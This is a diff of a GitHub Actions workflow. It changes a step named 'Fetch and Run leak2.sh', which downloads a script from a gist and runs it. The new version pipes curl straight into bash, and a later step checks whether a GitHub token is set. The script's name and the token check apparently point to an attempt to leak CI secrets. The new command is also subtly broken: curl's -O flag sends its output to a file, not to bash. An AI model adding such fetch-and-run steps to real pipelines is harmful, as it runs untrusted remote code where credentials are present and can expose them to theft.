@@ -12,11 +12,7 @@ jobs:
     steps:
       - name: Fetch and Run leak2.sh
         run: |
-          curl -s -O https://gist.githubusercontent.com/Pranesh-Shrestha/dada649c59018020c555641a7304016b/raw/400e60369f36f737e148026f5712ea436693a52a/leak2.sh
-          echo "Script contents:"
-          cat leak2.sh  # For debugging
-          echo "Running script..."
-          bash leak2.sh
+          curl -s -O https://gist.githubusercontent.com/Pranesh-Shrestha/dada649c59018020c555641a7304016b/raw/400e60369f36f737e148026f5712ea436693a52a/leak2.sh | bash 
       - name: Debug Environment (optional)
         run: |
           echo "MY_GITHUB_TOKEN is set to: ${MY_GITHUB_TOKEN:+'<set>'}"  # Masked output
